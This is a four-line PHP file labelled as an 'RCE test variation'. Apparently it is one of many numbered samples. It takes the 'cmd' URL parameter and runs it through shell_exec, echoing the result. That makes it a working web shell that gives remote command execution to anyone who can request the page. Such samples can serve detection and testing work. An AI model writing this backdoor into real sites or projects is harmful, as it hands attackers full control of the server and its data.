<?php
// RCE test variation #1170
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>